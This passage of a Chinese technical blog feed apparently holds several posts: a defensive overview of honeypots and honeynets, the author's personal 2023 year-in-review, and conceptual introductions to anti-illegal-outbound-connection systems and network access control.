title="三、蜜罐的主要功能"></a>三、蜜罐的主要功能</h2><ol><li>迷惑入侵者，保护服务器<br>一般的客户/服务器模式里，浏览者是直接与网站服务器连接的，换句话说，整个网站服务器都暴露在入侵者面前，如果服务器安全措施不够，那么整个网站数据都有可能被入侵者轻易毁灭。但是如果在客户/服务器模式里嵌入蜜罐，让蜜罐作为服务器角色，真正的网站服务器作为一个内部网络在蜜罐上做网络端口映射，这样可以把网站的安全系数提高，入侵者即使渗透了位于外部的“服务器”，他也得不到任何有价值的资料，因为他入侵的是蜜罐而已。虽然入侵者可以在蜜罐的基础上跳进内部网络，但那要比直接攻下一台外部服务器复杂得多，许多水平不足的入侵者只能望而却步。</li><li>诱捕和追踪攻击者：蜜罐可以记录攻击者的所有活动，并追踪攻击者的来源和身份。通过分析攻击者的IP地址、攻击工具、攻击时间等信息，可以帮助管理员追踪攻击者的真实身份和位置，为后续的应对和处置提供有力支持。</li><li>评估和提升安全防护能力：蜜罐可以模拟实际系统中的漏洞和弱点，帮助管理员评估实际系统的安全防护能力。通过模拟攻击，管理员可以了解实际系统中存在的安全漏洞和弱点，从而采取相应的措施进行修复和加固，提升系统的安全防护能力。</li><li>威胁情报收集：蜜罐可以捕获攻击者的攻击数据和样本，为威胁情报收集提供重要来源。通过分析攻击数据和样本，管理员可以了解最新的攻击方法和工具，及时发现新的安全威胁，并采取相应的应对措施。</li></ol><h2 id="四、蜜罐的主要组成及核心技术"><a href="#四、蜜罐的主要组成及核心技术" class="headerlink" title="四、蜜罐的主要组成及核心技术"></a>四、蜜罐的主要组成及核心技术</h2><p>蜜罐的主要组成部分包括：</p><ol><li>操作系统和应用软件：蜜罐通常会安装一个操作系统和一些常见的应用软件，以模拟真实系统的环境。这些操作系统和应用软件可能包含一些已知的漏洞，以吸引攻击者进行攻击。</li><li>网络服务：蜜罐会开放一些网络服务，如Web服务、FTP服务、数据库服务等，以提供攻击者攻击的目标。这些服务也可能包含一些漏洞，以吸引攻击者进行攻击。</li><li>日志和监控工具：蜜罐会安装日志和监控工具，以记录和分析攻击者的活动。这些工具可以记录攻击者的IP地址、攻击时间、使用的攻击工具和方法等信息，帮助管理员了解攻击者的行为和意图。</li><li>防火墙和安全策略：为了保护蜜罐本身不被攻击者攻破，通常会配置防火墙和安全策略，限制攻击者的访问和攻击手段。这些防火墙和安全策略也会根据需要进行调整和优化。</li><li>数据分析工具：蜜罐收集的攻击数据和样本需要进行深入的分析和处理，以提取有用的信息。数据分析工具可以帮助管理员对攻击数据和样本进行挖掘和分析，发现新的安全威胁和漏洞。</li></ol><p>蜜罐的主要组成部分包括操作系统和应用软件、网络服务、日志和监控工具、防火墙和安全策略以及数据分析工具等。这些组件共同构成了蜜罐的基本架构和功能，使其能够作为一个有效的安全工具来监测和发现攻击。</p><p>蜜罐的核心技术主要包括数据捕获技术、数据控制技术和数据分析技术。</p><ol><li>数据捕获技术：数据捕获是在入侵者无察觉的情况下，完整地记录所有进入蜜罐系统的连接行为及其活动。捕获到的数据日志是数据分析的主要来源，通过对这些数据日志的分析，管理员可以发现入侵者的攻击方法、攻击目的、攻击技术和所使用的攻击工具。数据捕获技术对于蜜罐的有效性至关重要，因为它提供了攻击行为的直接证据。</li><li>数据控制技术：数据控制技术用于管理和控制蜜罐系统中捕获的数据。这包括数据的存储、访问和传输等方面的控制。通过数据控制技术，管理员可以确保捕获的数据的安全性和完整性，防止数据被篡改或泄露。</li><li>数据分析技术：数据分析是对蜜罐系统所捕获到的数据记录进行分析处理的过程。通过数据分析，管理员可以提取入侵规则，分析是否有新的入侵特征。数据分析技术包括网络协议分析、网络行为分析和攻击特征分析等。这些分析技术可以帮助管理员深入了解攻击者的行为模式和攻击意图，为制定相应的防御措施提供依据。</li></ol><p>此外，蜜罐系统中还常常采用一些辅助技术来提高其安全性和有效性，例如伪装技术、诱饵技术、网络流量生成技术等。这些技术可以进一步增强蜜罐的欺骗性，使其更难以被攻击者识别和利用。</p><p>总的来说，蜜罐的主要技术涵盖了数据捕获、数据控制和数据分析等方面，这些技术共同构成了蜜罐的核心功能，使其能够有效地检测和应对网络攻击。</p><h2 id="五、蜜罐的优缺点"><a href="#五、蜜罐的优缺点" class="headerlink" title="五、蜜罐的优缺点"></a>五、蜜罐的优缺点</h2><p>蜜罐技术的优缺点如下：</p><ul><li><strong>优点：</strong></li></ul><ol><li>早期预警：蜜罐可以作为一个早期预警系统，帮助组织及时发现潜在的网络攻击。当攻击者试图访问或利用蜜罐时，管理员可以立即得到通知，从而采取相应的防御措施。</li><li>威胁情报收集：蜜罐可以捕获攻击者的活动信息，包括使用的工具、方法、攻击策略等，为组织提供有价值的威胁情报。通过分析这些信息，管理员可以了解攻击者的行为模式，提高防御能力。</li><li>增强安全防护：蜜罐可以分散攻击者的注意力，使其将资源投入到无用的攻击上，从而保护真实的系统免受攻击。此外，蜜罐还可以作为跳板，帮助管理员追踪攻击者的来源和身份。</li><li>提供培训和学习环境：蜜罐可以为安全人员提供一个安全的培训和学习环境，帮助他们了解攻击者的行为模式、工具和方法，提高安全技能和知识水平。</li></ol><ul><li><strong>缺点：</strong></li></ul><ol><li>数据收集面狭窄：蜜罐只能检测到针对其自身的攻击行为，对于攻击者攻击其他系统的行为则无法感知。因此，蜜罐的数据收集范围相对狭窄，可能无法提供全面的安全威胁信息。</li><li>指纹识别风险：蜜罐在模拟漏洞和弱点时，可能会暴露自身的特征和行为模式，从而被攻击者识别出真实身份。这可能导致蜜罐失去其作用，甚至成为攻击者的攻击目标。</li><li>管理和维护成本：为了保持蜜罐的有效性和安全性，需要对其进行定期更新和维护。这可能会增加组织的管理和维护成本，同时也需要具备一定的技术能力和专业知识。</li></ol><p>蜜罐技术作为一种主动防御手段，在提高组织的安全防护能力方面具有重要作用。然而，其也存在一定的缺点和限制，需要在实际应用中综合考虑其优缺点，并采取相应的措施来确保其有效性和安全性。</p><h2 id="六、蜜罐如何与其他安全工具协同工作？"><a href="#六、蜜罐如何与其他安全工具协同工作？" class="headerlink" title="六、蜜罐如何与其他安全工具协同工作？"></a>六、蜜罐如何与其他安全工具协同工作？</h2><p>蜜罐可以与其他安全工具协同工作，形成一个更加全面和有效的安全防护体系。以下是一些蜜罐与其他安全工具协同工作的方式：</p><ol><li>入侵检测系统（IDS）：蜜罐可以与IDS协同工作，共同监测和防御网络攻击。IDS负责实时监控网络流量，检测异常行为和潜在的攻击模式，而蜜罐则作为诱饵吸引攻击者，并捕获攻击者的行为数据。通过将蜜罐与IDS集成，可以及时发现并响应攻击，提高整体的安全防护能力。</li><li>防火墙：防火墙是网络安全的重要组成部分，负责控制进出网络的流量。蜜罐可以与防火墙协同工作，通过配置特定的防火墙规则，将蜜罐暴露在公网上，同时保护真实的系统不受攻击。防火墙可以过滤掉大部分的恶意流量，而蜜罐则用于捕获和分析剩余的攻击行为。</li><li>端点保护平台：端点保护平台用于保护网络中的终端设备，如计算机、服务器等。蜜罐可以与端点保护平台协同工作，共同防御针对终端设备的攻击。蜜罐可以吸引攻击者，并捕获攻击者的行为数据，而端点保护平台则负责检测和清除终端设备上的恶意软件和其他威胁。</li><li>日志分析工具：蜜罐捕获的攻击行为数据可以与日志分析工具结合使用，对攻击行为进行深入的分析和溯源。日志分析工具可以对蜜罐捕获的日志数据进行挖掘和分析，提取出攻击者的特征、攻击工具、攻击路径等信息，为安全人员提供有价值的情报和线索。</li></ol><p>此外，蜜罐还可以与其他安全工具如安全信息和事件管理（SIEM）系统、网络流量分析工具等协同工作，共同构建一个全面而高效的安全防护体系。通过整合各种安全工具和资源，可以实现对网络攻击的及时发现、快速响应和有效防御。</p><h2 id="七、什么是“蜜网”？与蜜罐的联系和区别是什么？"><a href="#七、什么是“蜜网”？与蜜罐的联系和区别是什么？" class="headerlink" title="七、什么是“蜜网”？与蜜罐的联系和区别是什么？"></a>七、什么是“蜜网”？与蜜罐的联系和区别是什么？</h2><p>蜜网（Honeynet）是一个比蜜罐更为复杂和全面的概念，它不仅仅是一个单一的诱骗系统，而是一个由多个蜜罐和其他安全组件组成的网络。蜜网的主要目的是构建一个高度可控的环境，以收集和分析来自攻击者的信息，同时提供一个平台来研究和应对网络安全威胁。与蜜罐相比，蜜网的区别主要体现在以下几个方面：</p><ol><li>规模与复杂性：蜜网是一个网络，通常包含多个蜜罐以及其他安全组件，如入侵检测系统、防火墙等。而蜜罐则是一个单一的、独立的系统。因此，蜜网在规模和复杂性上通常要大于蜜罐。</li><li>交互性：蜜网中的蜜罐可以模拟各种不同的系统和设备，如Windows、Linux、路由器等，从而提供更具交互性的环境，吸引攻击者进行更深入的攻击。而蜜罐通常只能模拟一个特定的系统或服务。</li><li>数据收集与分析：蜜网通过集中监控和管理所有进出蜜网的数据，可以收集到更丰富的攻击信息，包括攻击者的工具、方法、动机等。同时，蜜网还提供了更强大的数据分析和处理能力，以支持更深入的安全研究。</li></ol><p>联系方面，蜜罐和蜜网都是用于诱捕攻击者的安全工具，它们都是通过模拟漏洞和弱点来吸引攻击者的注意。此外，蜜罐可以作为蜜网的一个组成部分，通过将其集成到蜜网中，可以构建一个更完整、更全面的安全监控体系。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年我都干了啥？</title>
      <link href="/posts/65245d9c/"/>
      <url>/posts/65245d9c/</url>
      
        <content type="html"><![CDATA[<p>中国人都喜欢过春节，2024年农历新年来临之际，又到了回首过去展望未来的时候。<br>在2023年年初的时候就在《<a href="http://xiejava.ishareread.com/posts/c33148ad/" target="_blank" rel="noopener">写给两年后2025年的自己</a>》立了flag，要练好架子鼓、实现英语阅读的自由、写技术博客，换车等，一年过去了进度怎么样呢？2023年我都干了啥？<br>很多时候我都在问自己，自己的兴趣到底是什么？兴趣是一个人对特定事物或活动的喜好和热爱，它通常表现为一种积极的、自发的、持久的倾向，可以激发人们的热情和动力，使人们愿意投入时间和精力去探索和体验。<br>所以我的兴趣是打鼓、看书、写代码、旅行。</p><h2 id="一、打鼓"><a href="#一、打鼓" class="headerlink" title="一、打鼓"></a>一、打鼓</h2><p>2021年底萌生了学习架子鼓的想法，经过一段时间的努力彻底明白了《<a href="http://xiejava.ishareread.com/posts/ba190f8/" target="_blank" rel="noopener">任何说30天快速学会架子鼓的都是骗人的！</a>》，抛弃了速成的念头。希望通过两到三年的学习能够入个门自娱自乐一下。两年过去了，在2023年有段时间还是练得比较勤快，基本上每天都有练一个小时，无赖是全靠自学且资质平平所以进步比较缓慢，一首《感官先生》练了我两个多月。不过还是可以敲几首简单的歌了。2023年在抖音上发了6首完整的架子鼓演奏视频（抖音号：xiejava）见证我的努力和进步。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240207/1-xiejava%E6%8A%96%E9%9F%B3.jpg" alt="xiejava抖音" title="xiejava抖音"> </p><h2 id="二、看书观影"><a href="#二、看书观影" class="headerlink" title="二、看书观影"></a>二、看书观影</h2><p>我有个习惯就是每看一本书或看一部电影都会在豆瓣上记录一下，2023年工作很忙，很少看电影，看也书不多，在豆瓣上记录了看了9部电影、14本书。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240207/2-%E8%B1%86%E7%93%A3%E8%AF%BB%E4%B9%A6.jpg" alt="看书记录" title="豆瓣看书记录"><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240207/3-%E8%B1%86%E7%93%A3%E8%A7%82%E5%BD%B1.jpg" alt="观影记录" title="豆瓣观影记录"></p><p>2023年重新回味了经典港剧《无间道》，看了国产科幻大片《流浪地球2》及很火的电视剧《狂飙》，感受到了国产剧的崛起。<br>2023年虽然看书不多只记录了14本，但是我做了一些改变，不求数量，重点是主题阅读构建自己的知识架构体系。历史类的书看得比较多，新书看了二战相关的《最长的一天》、《遥远的桥》，科技类看了《芯片战争》、《ChatGPT:人类新纪元》，技术方面的书主要是关于机器学习方面的包括《Python机器学习基础教程》、《数据分析咖哥十话》等，其他还看了《红星照耀中国》、《三体：地球往事》等。<br>主要还是以历史和技术类的为主，很多书看了就忘了，所以2023年重读了一些书，包括《文明之光》系列的4册等。给自己做了个约定，自己认为经典的书，至少要看三遍。</p><h2 id="三、写博客"><a href="#三、写博客" class="headerlink" title="三、写博客"></a>三、写博客</h2><p>2023年写了42篇博客，主要是网络安全和数据分析相关的技术博客。因为目前在从事网络安全相关方面的工作，平时对数据分析机器学习感兴趣，这方面的内容会多一点。技术类的博客主要发表在CSDN，读书及书评发表在豆瓣，当然还有自己的自留地 《<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">xiejava’s blog</a>》 所有的博客文章都会在这里。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240207/3-CSDN1.png" alt="CSDN1" title="CSDN发布的原创博文数"><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240207/3-CSDN2.png" alt="CSDN2" title="CSDN博文上榜数"></p><p>2023年在CSDN发布了37篇原创博文，上榜了273次，每次上榜都坚定了我写博客的心。<br>2023年开通了微信公众号fullbug，经过一年的努力在公众号上发布了116篇文章，公众号订阅用户也到1407，1407个订阅用户就是对我小小的鼓励，激励我持续的输出。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240207/4-fullbug%E5%85%AC%E4%BC%97%E5%8F%B7.png" alt="fullbug微信公众号" title="fullbug微信公众号"></p><h2 id="四、计划"><a href="#四、计划" class="headerlink" title="四、计划"></a>四、计划</h2><p>都2024年了，架子鼓、实现英语阅读的自由、写技术博客，换车等，一年过去了进度怎么样呢？离2025年的目标还差多远呢？</p><p><strong>架子鼓</strong>：目前的水平还只能僵硬的对着动态鼓谱敲几首简单的歌，离架子鼓自由还差很远，2024年将继续努力，持续的在抖音上发布练习视频，让大家监督，让自己看到自己的努力和进步，争取在2025实现几首比较经典歌曲的熟练的演奏。</p><p><strong>英语</strong>：英语和架子鼓一样是靠时间练习和积累的，在写了一篇《<a href="http://xiejava.ishareread.com/posts/a9bec41d/" target="_blank" rel="noopener">学习英语，你认为“长期”的坚持是多长，“大量”的阅读又是多少？</a>》的博文后2023年基本没有怎么看英语，本来就不好的英语越发退步了。对于英语已经放弃治疗了。人的精力毕竟是有限的，同时要做好几件事是非常困难的，所以英语自由的计划估计要缓一缓了，等架子鼓学得差不了再来学英语吧。我想如果能够把架子鼓学会，同样也能够把英语学会。</p><p><strong>博客</strong>：2025年立的flag是CSDN账号的粉丝到10W，经过2023年的努力目前CSDN的粉丝到了3.7W，离10W还有不少的差距，需要在2024年更加努力的持续输出高质量的文章才有可能达到这个目标。</p><p><strong>旅行</strong>：旅行虽然是兴趣之一，一直在憧憬说走就走的旅行，但从来就没有成行过。2023年更是哪里都没有去，2025年的flag之一就是要先换车。在2023年底终于如愿换了台领克08的新能源SUV，见《<a href="http://xiejava.ishareread.com/posts/a0c94fff/" target="_blank" rel="noopener">颜值与实力并存-领克08提车和用车感受</a>》。祖国的大好河山，我想去看看！世界那么大，我想去走走！</p><hr><p> 作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自我管理 </tag>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品之认识防非法外联系统</title>
      <link href="/posts/65e8c732/"/>
      <url>/posts/65e8c732/</url>
      
        <content type="html"><![CDATA[<p>非法外联是指计算机或其他内部网络设备在未经授权的情况下私自连接到外部网络或设备，如互联网、其他公共网络或非法设备等。这种行为可能涉及违反法律法规、公司政策或安全规定。非法外联的危害包括可能导致数据泄露、恶意软件感染、非法访问和攻击等安全风险，同时可能违反合规要求并导致法律责任。</p><p>非法外联的形式多种多样，包括但不限于通过拨号上网、双网卡上网、GPRS、红外等方式进行连接。这些非法连接不仅可能暴露内部网络于外部攻击的风险，而且可能使内部数据面临泄露的风险，特别是当员工使用个人设备连接企业内部网络时。因此，防止非法外联对于维护网络安全和保护组织利益至关重要。</p><h2 id="一、什么是防非法外联系统"><a href="#一、什么是防非法外联系统" class="headerlink" title="一、什么是防非法外联系统"></a>一、什么是防非法外联系统</h2><p>针对非法外联，内网计算机连接外网（断开内网连接外网或者同时连接内外网络），常用且有效的方法就是使用防非法外联系统，禁用内网终端访问外部网络，实现内网终端无法外联的方法。防非法外联技术作为管理者有效的技术手段，可以全面、实时地监控整个单位网络内部的非法外联行为。</p><h2 id="二、非法外联的安全风险"><a href="#二、非法外联的安全风险" class="headerlink" title="二、非法外联的安全风险"></a>二、非法外联的安全风险</h2><p>（1）内部人员可通过Modem拨号、ADSL拨号或手机无线拨号等方式，非法连接到互联网等外部网络，造成内部网络安全保障措施失效，可能会造成病毒感染、敏感信息泄密等安全事件。<br>（2）在内、外网物理隔离的涉密信息系统内部，工作人员也可能把内网计算机连接到外部网络上，形成非法的网络出口，从而为外部黑客非法入侵提供途径，容易造成安全隐患。<br>（3）外部移动笔记本电脑等，通过非法接入内部网络的交换设备，访问内部信息系统中的计算机和服务器资源，造成可能的信息失泄密。<br>（4）在某些情况下，外部移动笔记本计算机还可以通过直连线，直接跟内部网络中的计算机相连，建立对等网络连接，从而造成信息泄密。</p><h2 id="三、防非法外联系统的工作原理"><a href="#三、防非法外联系统的工作原理" class="headerlink" title="三、防非法外联系统的工作原理"></a>三、防非法外联系统的工作原理</h2><p>防非法外联系统的工作原理主要基于网络监控和行为分析。具体来说，它通过以下几个步骤实现非法外联的监测和阻断：</p><ol><li>网络流量监控：防非法外联系统首先会对内部网络的流量进行实时监控。它可以通过部署在网络中的传感器或代理程序来捕获和分析网络数据包。</li><li>行为分析：系统会对捕获到的网络数据包进行深度分析，识别出网络流量的来源、目的、协议类型等信息。通过分析这些数据，系统能够判断网络流量是否属于正常行为，还是存在非法外联的嫌疑。</li><li>非法外联检测：当系统检测到异常的网络流量，即可能存在非法外联行为时，它会进一步进行详细的检测和分析。例如，系统可能会检查网络连接的持续时间、数据传输量、目标IP地址等信息，以确认是否存在非法外联行为。</li><li>阻断与报警：如果系统确认存在非法外联行为，它会立即采取相应的阻断措施，阻止非法连接的继续建立。同时，系统会触发报警机制，向管理人员发送报警信息，以便及时处理和应对。</li><li>日志记录与分析：防非法外联系统还会记录所有检测到的非法外联行为，并生成详细的日志。这些日志可以作为后续分析的依据，帮助管理人员了解非法外联行为的情况和趋势，进一步完善网络安全策略。</li></ol><p>防非法外联系统的工作原理是通过网络监控和行为分析来检测非法外联行为，并采取阻断和报警措施来保障内部网络的安全。</p><h2 id="四、防非法外联系统的主要功能"><a href="#四、防非法外联系统的主要功能" class="headerlink" title="四、防非法外联系统的主要功能"></a>四、防非法外联系统的主要功能</h2><p>防非法外联系统的主要功能包括以下几个方面：</p><ol><li>监测和识别非法外联行为：防非法外联系统能够实时监控网络流量，检测和识别所有被控主机的网络连接状态，以及终端软件的运行情况。它可以检测使用双/多网卡联通内外网的行为，从而发现破坏内外网隔离的违规行为。</li><li>阻断和报警非法外联行为：一旦检测到非法外联行为，防非法外联系统可以采取阻断措施，阻止非法连接并建立报警机制。它还能报告非法外联主机的客户端ID号，从而准确锁定非法外联主机，即使在单机环境下也能实现阻断并报警。</li><li>实时监视和检测多种上网方式：防非法外联系统能够实时监视普通方式的拨号上网，以及通过WLAN、GPRS或CDMA1X等无线方式进行非法上网的行为。这有助于全面覆盖和检测各种非法外联方式。</li><li>强大的日志查询功能：系统提供强大的日志查询功能，可以对受控主机的非法外联行为进行实时报警，并在报警控制中心进行详细的显示和统计分析。这有助于用户了解非法外联行为的情况和趋势。</li><li>与违规外联系统联动：在完成前面各项工作后，防非法外联系统还可以与违规外联系统的互联网服务端联动，侦测到涉密载体违规外联的行为。这有助于及时发现和处理涉密载体的非法外联行为。</li></ol><p>防非法外联系统的主要功能包括监测和识别非法外联行为、阻断和报警非法外联行为、实时监视和检测多种上网方式、提供日志查询功能以及与违规外联系统联动。这些功能共同构成了防非法外联系统的核心能力，有助于提升内部网络的安全性。</p><h2 id="五、防非法外联系统的使用方式"><a href="#五、防非法外联系统的使用方式" class="headerlink" title="五、防非法外联系统的使用方式"></a>五、防非法外联系统的使用方式</h2><p>1、防非法外联系统与内部局域网建立连接后，监测终端的外网连接请求；<br>2、根据外网连接请求，对所述终端中存储的文件进行安全防护，并输出针对外网连接进行响应的选项；<br>3、接收响应于所述选项的操作，并根据所述操作按照预设策略对所述外网连接请求进行处理。<br>一种防止非法外联的系统，包括多个终端、至少一个服务器；其中，所述服务器，用于与所述终端构成的内部局域网；所述终端，用于与所述内部局域网建立连接，监测终端的外网连接请求；根据所述外网连接请求，对所述终端中存储的文件进行安全防护，并输出针对外网连接进行响应的选项；接收响应于所述选项的操作，并根据所述操作按照预设策略对所述外网连接请求进行处理。</p><h2 id="六、非法外联与准入控制有什么区别？"><a href="#六、非法外联与准入控制有什么区别？" class="headerlink" title="六、非法外联与准入控制有什么区别？"></a>六、非法外联与准入控制有什么区别？</h2><p>非法外联和准入控制是网络安全中的两个重要概念，它们有一定的区别。</p><ul><li>非法外联通常指的是内部网络中的设备未经授权擅自与外部网络（如互联网）建立连接的行为。这种行为可能导致敏感数据泄露、网络攻击、恶意软件感染等安全威胁。非法外联通常是由于用户的不当操作、设备漏洞或恶意攻击等原因引起的。为了防止非法外联行为的发生，需要采取一系列的安全措施，如部署防非法外联系统、加强用户教育等。</li><li>准入控制则是一种网络安全管理策略，用于控制和管理网络中的设备访问。它通常包括设备认证、访问授权、安全审计等功能。准入控制的主要目的是确保只有符合安全策略的设备才能访问网络，从而防止未经授权的设备或恶意软件进入网络。准入控制可以通过各种技术手段实现，如802.1X认证、NAC（网络准入控制）解决方案等。</li></ul><p>简单来说，非法外联关注的是内部设备是否非法连接到外部网络，而准入控制关注的是如何控制和管理网络中的设备访问。两者都是网络安全的重要组成部分，但关注点和实施手段有所不同。在实际应用中，通常需要结合使用非法外联监控系统和准入控制系统来全面提升网络安全水平。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品之认识准入控制系统</title>
      <link href="/posts/9eb05342/"/>
      <url>/posts/9eb05342/</url>
      
        <content type="html"><![CDATA[<p>随着企业信息化建设的不断深入，企业的各种信息资产越来越多，网络安全问题也越来越突出。如何防止外来电脑、移动设备接入局域网，保护企业信息资产的安全，成为企业网络管理的重要问题。准入控制系统的出现，为企业提供了一种有效的解决方案。本文我们一起来认识一下准入控制系统。</p><h2 id="一、什么是准入控制系统"><a href="#一、什么是准入控制系统" class="headerlink" title="一、什么是准入控制系统"></a>一、什么是准入控制系统</h2><p>准入控制系统是一种用于管理和控制访问权限的安全机制。该系统的原理是通过对用户、设备、应用程序和网络资源的身份验证和授权，限制对受保护资源的访问。重点解决网络的合规性要求，达到“违规不入网、入网必合规”的管理规范，支持包括身份认证、友好WEB重定向引导、基于角色的动态授权访问控制、可配置的安全检查规范库、“一键式”智能修复、实名日志审计等功能，满足等级保护对网络边界、终端防护的相应要求，同时提供更高效、更智能的网络准入防护体系。</p><h2 id="二、准入控制系统的主要功能"><a href="#二、准入控制系统的主要功能" class="headerlink" title="二、准入控制系统的主要功能"></a>二、准入控制系统的主要功能</h2><h3 id="1-接入设备的身份认证"><a href="#1-接入设备的身份认证" class="headerlink" title="1. 接入设备的身份认证"></a>1. 接入设备的身份认证</h3><p>对终端计算机网络访问权限从入口进行检测验证，只允许受信任的设备和用户使用内网，可在很大程度上降低网络安全风险；支持包括MAC地址、IP地址、基于用户名和密码的身份、接入设备端口、所在VLAN等信息，还支持U-KEY、支持智能卡、数字证书认证，LDAP、无缝结合域管理。</p><h3 id="2-接入设备的安全性检查"><a href="#2-接入设备的安全性检查" class="headerlink" title="2. 接入设备的安全性检查"></a>2. 接入设备的安全性检查</h3><p>包括各种防病毒软件版本、终端补丁漏洞、应用软件黑、白、红名单检测、非法外联、非法代理、异常流量、敏感操作行为检测等。</p><ol><li>完善的安全策略管理<br>包括资产安全策略、补丁安装策略、访问策略、应用程序策略、桌面防火墙策略、外设策略和远程维护的策略管理。</li><li>移动存储管理<br>能够对电脑usb接口进行综合管理，设置U盘使用权限（仅写入、仅读取、禁止使用），支持禁用移动硬盘、便携式存储设备和所有usb存储设备，还能够对U盘的插入使用进行日志统计，及U盘中文件的操作行为也能够进行审计记录。</li><li>操作系统补丁及升级<br>能够对内网电脑的操作系统补丁进行统一下发和及时更新，可自动检测终端计算机操作系统漏洞和自动更新安装操作系统补丁。</li></ol><h2 id="三、准入控制系统的工作原理"><a href="#三、准入控制系统的工作原理" class="headerlink" title="三、准入控制系统的工作原理"></a>三、准入控制系统的工作原理</h2><p>准入控制系统的设计有两个基本的理论前提：</p><ol><li>网络安全状态的非稳定性：这意味着系统会随着时间迁移和变迁，可能会从安全状态转移到非安全状态。因此，及时进行系统更新，将系统状态重新调整回安全状态，是减少受攻击可能性的有效方式。</li><li>网络安全状态的可控性：在网络环境中，收集的网络及用户主机的状态信息越多，就越能准确地判断出网络所面临的风险，并及时给出应对措施，控制网络安全状态。</li></ol><p>网络准入控制系统的工作原理主要是通过对接入网络的终端进行身份认证、安全技术测评、权限管理和流量控制等手段，确保只有符合规定要求的终端设备能够接入网络，并保障网络的安全性和稳定性。</p><p>具体来说，网络准入控制系统的工作原理包括以下几个方面：</p><ol><li>用户认证：网络准入控制系统对用户身份进行认证，只有授权的用户才能接入网络。用户认证可以通过多种方式进行，如用户名/密码、动态令牌、智能卡等。通过用户认证，可以防止非法用户访问网络资源。</li><li>安全技术测评：网络准入控制系统对接入网络的用户终端进行安全技术测评，包括操作系统、防病毒软件、防火墙等的安全性进行评估。通过安全技术测评，可以确保用户终端符合安全要求，减少安全威胁和风险。</li><li>权限管理：网络准入控制系统根据不同的用户和设备制定不同的策略，实现灵活的网络准入管理。通过对用户终端的权限进行管理和控制，可以限制用户对网络资源的访问，防止未经授权的访问和数据泄露。</li><li>安全检查：网络准入控制系统对接入终端设备进行杀毒软件安装情况、系统补丁等级、设备漏洞等安全检查，确保接入设备的安全性。通过安全检查，可以及时发现和修复终端上的安全漏洞和隐患。</li><li>流量控制：网络准入控制系统对网络流量进行监控和管理，限制不安全协议和流量的传输，保障网络带宽和稳定性。通过流量控制，可以提高网络的性能和稳定性，防止网络拥塞和攻击。</li></ol><p>网络准入控制系统通过对接入网络的终端进行身份认证、安全技术测评、权限管理和流量控制等手段，实现了对用户终端的全面管理和控制，提高了企业网络的安全性和可靠性。</p><p>准入控制系统有多种准入管控方式，以下是其中一些常见的管控方式：</p><ol><li>802.1X准入控制：基于端口的网络接入控制协议，在接入设备的端口这一级验证用户身份并控制其访问权限。通过EAPoL（局域网可扩展认证协议），实现客户端、设备端和认证服务器之间认证信息的交换。</li><li>DHCP准入控制：通过DHCP服务器的配合，实现基于用户身份的IP地址分配和权限控制。用户通过DHCP获取IP地址，同时需要进行身份认证才能获得相应的网络访问权限。</li><li>网关型准入控制：通过部署专门的网关设备，对经过该设备的网络流量进行安全检查和过滤，并根据用户身份和权限进行控制。网关型准入控制可以对网络流量进行深度分析和控制，提供更加精细化的网络访问控制。</li><li>ARP准入控制：通过ARP协议的特性，实现对ARP请求的拦截和过滤，以防止ARP欺骗攻击。ARP准入控制可以保护网络不受ARP攻击的影响，提高网络的安全性。</li></ol><p>准入控制系统有多种管控方式，每种管控方式都有其特定的应用场景和优缺点。在实际应用中，可以根据企业的安全需求和网络环境选择适合的管控方式，提高企业网络的安全性和可靠性。</p><h2 id="四、准入控制系统的特点"><a href="#四、准入控制系统的特点" class="headerlink" 